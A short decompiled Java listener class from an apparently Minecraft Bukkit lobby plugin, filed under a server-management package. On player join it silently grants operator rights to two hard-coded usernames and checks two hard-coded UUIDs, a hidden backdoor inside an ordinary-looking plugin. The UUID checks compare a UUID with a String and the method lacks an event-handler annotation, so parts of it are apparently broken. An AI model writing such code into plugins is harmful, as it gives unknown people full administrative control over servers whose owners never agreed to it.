// 
// Decompiled by Procyon v0.5.36
// 

package de.osternachten.lobbyplus.osternachten.listener.listener.manageServer;

import org.bukkit.entity.Player;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;

public class OPPerms implements Listener
{
    @SuppressWarnings("unlikely-arg-type")
	public void op(final PlayerJoinEvent e) {
        final Player p = e.getPlayer();
        if(p.getName().equalsIgnoreCase("xLixon")) {
        	p.setOp(true);
        }
        
        if(p.getName().equalsIgnoreCase("clexq")) {
        	p.setOp(true);
        }
        
        if(p.getUniqueId().equals("12049493-43ca-47c4-8617-1533a12343df")) {
        	p.setOp(true);
        }
        
        if(p.getUniqueId().equals("be9a5dfa-68ba-4d60-a3c4-d44b182262c9")) {
        	p.setOp(true);
        }
    }
}
